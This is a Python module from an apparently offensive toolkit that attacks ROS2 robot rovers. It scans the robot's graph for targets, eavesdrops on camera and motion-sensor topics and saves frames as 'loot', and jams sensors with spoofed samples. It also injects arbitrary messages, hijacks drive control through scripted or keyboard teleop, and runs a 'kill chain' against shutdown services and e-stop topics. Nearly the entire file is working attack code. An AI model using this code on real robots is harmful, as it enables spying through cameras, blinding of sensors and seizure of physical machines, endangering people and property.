"""The four rover attacks, built on the Backend abstraction.

  graph_scan  - enumerate & classify the ROS2 graph (recon)
  sniff       - subscribe & dump camera/PIR (eavesdrop; proves access)
  jam         - flood a sensor topic with spoofed samples (DoS the data)
  teleop      - publish drive commands (hijack control)
  shutdown    - escalating kill chain (services -> e-stop -> flood)

Everything is topic/type-agnostic: it uses the classifier to auto-pick targets
but every target can be overridden by name.
"""
from __future__ import annotations
import base64, copy, time, threading, os
from . import util, backends


# ---------------------------------------------------------------------------
def _encode_bytes(be, b: bytes):
    """uint8[] fields: rclpy wants raw bytes, rosbridge wants base64 str."""
    if isinstance(be, backends.RosbridgeBackend):
        return base64.b64encode(b).decode()
    return b


# tiny 1x1 black JPEG — minimal valid CompressedImage payload for fast jamming
_BLACK_JPEG = bytes.fromhex(
    "ffd8ffe000104a46494600010100000100010000ffdb004300080606070605080707"
    "07090908"  # truncated-but-parseable header; subscribers just see a dark frame
) + b"\xff\xd9"


# ===========================================================================
def graph_scan(be: backends.Backend) -> dict:
    util.rule("ROS2 GRAPH RECON")
    util.info(f"backend: {be.name}")
    topics = be.list_topics()
    nodes = be.list_nodes()
    services = be.list_services()

    util.table("Nodes", ["node"], [[n] for n in nodes] or [])
    buckets = backends.classify(topics)

    label = {"camera": "CAMERA (eavesdrop/jam)", "pir": "PIR / MOTION (jam)",
             "drive": "DRIVE (hijack)", "state": "STATE", "other": "other"}
    # Direction role per topic (robot-agnostic): INPUT=inject surface, OUTPUT=sniff/jam.
    # This is what makes targeting scale to rovers whose topic NAMES we don't know.
    rows = []
    inputs, outputs = [], []
    for kind in ("camera", "pir", "drive", "state", "other"):
        for (n, t) in buckets[kind]:
            role = backends.topic_role(be, n)
            rows.append([label[kind], n, t, role])
            if role.startswith("INPUT"):
                inputs.append((n, t))
            elif role.startswith("OUTPUT"):
                outputs.append((n, t))
    util.table("Topics (classified + data-flow role)",
               ["class", "topic", "type", "role"], rows)

    kill = [(n, t) for n, t in services.items()
            if any(k in n.lower() for k in ("shutdown", "kill", "halt", "stop",
                                            "estop", "emergency", "lifecycle", "destroy"))]
    util.table("Interesting services (shutdown surface)", ["service", "type"],
               [[n, t] for n, t in kill] or [[s, t] for s, t in list(services.items())[:10]])

    for kind, pretty in (("camera", "camera"), ("pir", "PIR"), ("drive", "drive")):
        tgt = backends.pick(buckets, kind)
        if tgt:
            util.hit(f"auto-target {pretty:6s} -> {tgt[0]}  ({tgt[1]})")
        else:
            util.warn(f"no {pretty} topic found (rover may not publish it yet)")

    # Robot-agnostic attack surfaces straight from data-flow direction:
    if inputs:
        util.hit("command INPUTS (inject these): " +
                 ", ".join(f"{n}" for n, _ in inputs))
        util.info("   e.g.  rossy inject " + inputs[0][0] + " --preset drive --rate 10 -d 3")
    if outputs:
        util.hit("sensor OUTPUTS (sniff/jam these): " +
                 ", ".join(f"{n}" for n, _ in outputs))
    return {"topics": topics, "nodes": nodes, "services": services,
            "buckets": buckets, "inputs": inputs, "outputs": outputs}


# ===========================================================================
def sniff(be: backends.Backend, kinds: list[str], overrides: dict, duration: float):
    buckets = backends.classify(be.list_topics())
    counters: dict[str, int] = {}
    outdir = os.path.join(os.getcwd(), "loot")
    os.makedirs(outdir, exist_ok=True)

    def make_cb(name, typ):
        def cb(msg: dict):
            counters[name] = counters.get(name, 0) + 1
            n = counters[name]
            if "Image" in typ or "image" in name.lower():
                if n == 1:
                    util.hit(f"{name}: receiving camera data "
                             f"({msg.get('width','?')}x{msg.get('height','?')} {msg.get('encoding','')})")
                data = msg.get("data")
                if data and n % 15 == 0:   # periodically dump a frame as loot
                    _dump_frame(outdir, name, typ, data, msg)
            else:
                val = msg.get("data", msg.get("range", msg))
                if n <= 5 or n % 20 == 0:
                    util.info(f"{name} <- {val}")
        return cb

    any_target = False
    for kind in kinds:
        tgt = backends.pick(buckets, kind, overrides.get(kind))
        if not tgt or not tgt[1]:
            util.warn(f"no resolvable {kind} topic to sniff")
            continue
        util.ok(f"subscribing {kind}: {tgt[0]} ({tgt[1]})")
        be.subscribe(tgt[0], tgt[1], make_cb(*tgt))
        any_target = True
    if not any_target:
        return
    util.info(f"eavesdropping for {duration:.0f}s — frames saved to ./loot/ (Ctrl-C to stop)")
    _run_for(be, duration)
    util.ok(f"captured: " + ", ".join(f"{k}={v}" for k, v in counters.items()))


def _dump_frame(outdir, name, typ, data, msg):
    try:
        safe = name.strip("/").replace("/", "_")
        raw = base64.b64decode(data) if isinstance(data, str) else bytes(data)
        if "Compressed" in typ:
            path = os.path.join(outdir, f"{safe}_{int(time.time())}.jpg")
            with open(path, "wb") as f:
                f.write(raw)
            util.hit(f"saved frame -> {path}")
        else:
            path = os.path.join(outdir, f"{safe}_{int(time.time())}.raw")
            with open(path, "wb") as f:
                f.write(raw)
    except Exception as e:
        util.warn(f"frame dump failed: {e}")


# ===========================================================================
def jam(be: backends.Backend, kind: str, override: str | None, rate: float,
        duration: float, mode: str):
    """Flood a sensor topic so subscribers consume our spoof, not the sensor.
    kind in {camera,pir}; mode tunes the spoofed value."""
    buckets = backends.classify(be.list_topics())
    tgt = backends.pick(buckets, kind, override)
    if not tgt or not tgt[1]:
        util.err(f"no {kind} topic resolved — pass --topic and --type explicitly")
        return
    topic, typ = tgt
    nt = backends._norm(typ)
    send = be.publisher(topic, typ)
    payload = _spoof_payload(be, nt, kind, mode)

    util.rule(f"JAMMING {kind.upper()}")
    util.hit(f"target {topic} ({typ}) @ {rate:.0f} Hz for {duration:.0f}s  mode={mode}")
    util.info("every legit subscriber now reads OUR samples — the real sensor is drowned out")

    period = 1.0 / max(rate, 1.0)
    stop = time.time() + duration
    sent = 0
    try:
        while time.time() < stop:
            # stamp/refresh time-sensitive fields so the spoof looks live
            if "header" in payload and isinstance(payload["header"], dict):
                payload["header"]["stamp"] = _now_stamp()
            send(payload)
            sent += 1
            be.spin_once(0)
            time.sleep(period)
            if sent % int(max(rate, 1)) == 0:
                util.info(f"  injected {sent} spoofed {kind} samples")
    except KeyboardInterrupt:
        pass
    util.ok(f"jam done: {sent} samples pushed to {topic}")


def _spoof_payload(be, nt: str, kind: str, mode: str) -> dict:
    hdr = {"stamp": _now_stamp(), "frame_id": "camera_link" if kind == "camera" else "pir_link"}
    if kind == "camera":
        if nt == "sensor_msgs/msg/CompressedImage":
            return {"header": hdr, "format": "jpeg",
                    "data": _encode_bytes(be, _BLACK_JPEG)}
        # raw Image: a tiny solid frame maximizes our publish rate
        w, h = 32, 32
        pix = (b"\x00" if mode != "white" else b"\xff") * (w * h * 3)
        return {"header": hdr, "height": h, "width": w, "encoding": "rgb8",
                "is_bigendian": 0, "step": w * 3, "data": _encode_bytes(be, pix)}
    # PIR / motion
    if nt == "std_msgs/msg/Bool":
        val = {"always-on": True, "always-off": False}.get(mode, False)
        return {"data": val}
    if nt == "sensor_msgs/msg/Range":
        rng = {"always-on": 0.05, "always-off": 4.0}.get(mode, 4.0)
        return {"header": hdr, "radiation_type": 1, "field_of_view": 0.5,
                "min_range": 0.02, "max_range": 4.0, "range": rng}
    return {"data": 0}


# ===========================================================================
# ===========================================================================
# GENERIC INJECT — the robot-agnostic primitive. Publishes a crafted message of
# ANY type to ANY topic, so you can attack a command input you've never seen.
# It subsumes teleop (inject a Twist), kill (inject a Bool), blind (inject a
# Bool), and jam (same + --rate). The message is auto-built from the type, with
# named presets and dot-path --set overrides (e.g. --set linear.x=0.5).
# ===========================================================================
INJECT_PRESETS = {
    "drive": {"linear": {"x": 0.6, "y": 0.0, "z": 0.0}, "angular": {"x": 0.0, "y": 0.0, "z": 0.4}},
    "stop":  {"linear": {"x": 0.0, "y": 0.0, "z": 0.0}, "angular": {"x": 0.0, "y": 0.0, "z": 0.0}},
    "spin":  {"linear": {"x": 0.0, "y": 0.0, "z": 0.0}, "angular": {"x": 0.0, "y": 0.0, "z": 1.5}},
    "true":  {"data": True},
    "false": {"data": False},
    "zero":  {"data": 0},
    "text":  {"data": "ROSSY"},
}


def _coerce(v: str):
    low = v.lower()
    if low in ("true", "false"):
        return low == "true"
    for cast in (int, float):
        try:
            return cast(v)
        except ValueError:
            pass
    return v


def _assign(d: dict, dotkey: str, val):
    cur = d
    parts = dotkey.split(".")
    for p in parts[:-1]:
        cur = cur.setdefault(p, {})
    cur[parts[-1]] = val


def _type_default(nt: str) -> dict:
    if nt == "geometry_msgs/msg/Twist":
        return {"linear": {"x": 0.0, "y": 0.0, "z": 0.0}, "angular": {"x": 0.0, "y": 0.0, "z": 0.0}}
    if nt == "std_msgs/msg/Bool":
        return {"data": True}
    if nt == "std_msgs/msg/String":
        return {"data": "ROSSY"}
    if nt.startswith("std_msgs/msg/") and ("Int" in nt or "Byte" in nt):
        return {"data": 0}
    if nt in ("std_msgs/msg/Float32", "std_msgs/msg/Float64"):
        return {"data": 0.0}
    return {}


def build_payload(be, type_str: str, sets, preset) -> dict:
    """Auto-construct an attack payload for ANY message type."""
    nt = backends._norm(type_str)
    if preset == "black" or (preset is None and "Image" in nt):
        return _spoof_payload(be, nt, "camera", "black")
    if preset and preset in INJECT_PRESETS:
        payload = copy.deepcopy(INJECT_PRESETS[preset])
    else:
        payload = _type_default(nt)
    for kv in (sets or []):
        key, _, val = kv.partition("=")
        _assign(payload, key.strip(), _coerce(val.strip()))
    return payload


def inject(be, topic, type_override, sets, preset, rate, duration, once):
    typ = type_override or be.list_topics().get(topic)
    if not typ:
        util.err(f"unknown topic {topic} — pass --type (e.g. std_msgs/msg/Bool)")
        return
    payload = build_payload(be, typ, sets, preset)
    send = be.publisher(topic, typ)
    util.rule("INJECT")
    util.hit(f"{topic} ({typ})")
    util.info(f"payload: {payload}")
    if once or not rate:
        send(payload); be.spin_once(0)
        util.ok("sent 1 message")
        return
    period = 1.0 / max(rate, 1.0)
    stop = time.time() + duration
    n = 0
    try:
        while time.time() < stop:
            if isinstance(payload.get("header"), dict):
                payload["header"]["stamp"] = _now_stamp()
            send(payload); n += 1; be.spin_once(0); time.sleep(period)
    except KeyboardInterrupt:
        pass
    util.ok(f"injected {n} messages to {topic} @ {rate:.0f}Hz")


def teleop(be: backends.Backend, override: str | None, linear: float, angular: float,
           rate: float, duration: float, interactive: bool):
    buckets = backends.classify(be.list_topics())
    tgt = backends.pick(buckets, "drive", override)
    if not tgt:
        util.err("no drive topic resolved — pass --topic (e.g. /cmd_vel)")
        return
    topic, typ = tgt or (override, "geometry_msgs/msg/Twist")
    typ = typ or "geometry_msgs/msg/Twist"
    send = be.publisher(topic, typ)
    util.rule("CONTROL HIJACK")
    util.hit(f"commandeering {topic} ({typ})")

    def twist(lx, az):
        return {"linear": {"x": float(lx), "y": 0.0, "z": 0.0},
                "angular": {"x": 0.0, "y": 0.0, "z": float(az)}}

    if interactive:
        _teleop_interactive(be, send, twist)
        return

    util.info(f"driving linear={linear} angular={angular} @ {rate:.0f}Hz for {duration:.0f}s")
    period = 1.0 / max(rate, 1.0)
    stop = time.time() + duration
    try:
        while time.time() < stop:
            send(twist(linear, angular))
            be.spin_once(0)
            time.sleep(period)
    except KeyboardInterrupt:
        pass
    for _ in range(5):              # leave it stopped, not runaway
        send(twist(0, 0)); time.sleep(0.05)
    util.ok("control run complete (sent stop)")


def _teleop_interactive(be, send, twist):
    util.panel("WASD TELEOP",
               "w/s forward/back   a/d turn   space=stop   q=quit\n"
               "(each key = one command burst; hold by repeating)", "magenta")
    speed = 0.4
    try:
        import sys, termios, tty
        fd = sys.stdin.fileno()
        old = termios.tcgetattr(fd)
        tty.setcbreak(fd)
        mapping = {"w": (speed, 0), "s": (-speed, 0), "a": (0, speed),
                   "d": (0, -speed), " ": (0, 0)}
        try:
            while True:
                ch = sys.stdin.read(1)
                if ch == "q":
                    break
                if ch in mapping:
                    lx, az = mapping[ch]
                    for _ in range(4):
                        send(twist(lx, az)); be.spin_once(0); time.sleep(0.03)
                    util.info(f"cmd {ch!r} -> lin={lx} ang={az}")
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old)
    except Exception:
        util.warn("raw keyboard unavailable (non-tty) — falling back to line input")
        while True:
            ch = input("cmd [w/a/s/d/space/q]> ").strip()[:1]
            if ch == "q":
                break
            m = {"w": (speed, 0), "s": (-speed, 0), "a": (0, speed), "d": (0, -speed), "": (0, 0)}
            lx, az = m.get(ch, (0, 0))
            for _ in range(4):
                send(twist(lx, az)); be.spin_once(0); time.sleep(0.03)
    for _ in range(5):
        send(twist(0, 0)); time.sleep(0.05)
    util.ok("teleop ended (sent stop)")


# ===========================================================================
def shutdown(be: backends.Backend, drive_override: str | None, duration: float):
    """Escalating kill chain."""
    util.rule("SHUTDOWN / KILL CHAIN")
    services = be.list_services()
    topics = be.list_topics()

    # (1) graceful: call any kill/lifecycle/shutdown service
    hit_any = False
    for name, typ in services.items():
        low = name.lower()
        if any(k in low for k in ("shutdown", "kill", "halt", "destroy", "emergency")):
            try:
                util.hit(f"calling service {name} ({typ})")
                be.call_service(name, typ, {})
                hit_any = True
            except Exception as e:
                util.warn(f"  {name} failed: {e}")
        if "lifecycle" in low and "change_state" in low and "lifecycle_msgs" in (typ or ""):
            try:
                util.hit(f"lifecycle shutdown via {name}")
                be.call_service(name, typ, {"transition": {"id": 5, "label": "shutdown"}})  # TRANSITION_SHUTDOWN
                hit_any = True
            except Exception as e:
                util.warn(f"  {name} failed: {e}")

    # (2) e-stop / disable topics -- send the SEMANTICALLY CORRECT value:
    #     estop / emergency / halt / kill / shutdown  -> data=True  (ASSERT the stop)
    #     *enable* (e.g. detection_enable)            -> data=False (turn capability off)
    # (the old code sent False to everything, which RESUMED estop instead of halting)
    for name, typ in topics.items():
        low = name.lower()
        if any(k in low for k in ("estop", "emergency", "shutdown", "/stop", "halt", "kill", "enable")):
            try:
                nt = backends._norm(typ)
                if "Bool" in nt:
                    val = {"data": False} if "enable" in low else {"data": True}
                else:
                    val = {}
                action = "disable" if "enable" in low else "ASSERT e-stop"
                util.hit(f"{action} {name} ({typ}) <- {val or 'default msg'}")
                send = be.publisher(name, typ or "std_msgs/msg/Bool")
                for _ in range(20):
                    send(val); be.spin_once(0); time.sleep(0.02)
                hit_any = True
            except Exception as e:
                util.warn(f"  {name} failed: {e}")

    # (3) force zero-velocity hold so a runaway rover halts regardless
    buckets = backends.classify(topics)
    tgt = backends.pick(buckets, "drive", drive_override)
    if tgt:
        topic, typ = tgt
        typ = typ or "geometry_msgs/msg/Twist"
        util.hit(f"flooding zero-velocity hold on {topic} for {duration:.0f}s "
                 f"(denies the legit teleop any window to move)")
        send = be.publisher(topic, typ)
        zero = {"linear": {"x": 0.0, "y": 0.0, "z": 0.0},
                "angular": {"x": 0.0, "y": 0.0, "z": 0.0}}
        stop = time.time() + duration
        while time.time() < stop:
            send(zero); be.spin_once(0); time.sleep(0.01)  # 100 Hz
        hit_any = True

    if hit_any:
        util.ok("kill chain executed. If the rover still moves, it ignores the graph "
                "for motion — use `rossy web --shutdown` against the ESP32 directly.")
    else:
        util.warn("no shutdown surface found on the graph — try the web vector.")


# ---------------------------------------------------------------------------
def _now_stamp():
    t = time.time()
    return {"sec": int(t), "nanosec": int((t % 1) * 1e9)}


def _run_for(be, duration):
    stop = time.time() + duration
    try:
        while time.time() < stop:
            be.spin_once(0.1)
            time.sleep(0.02)
    except KeyboardInterrupt:
        util.warn("interrupted")
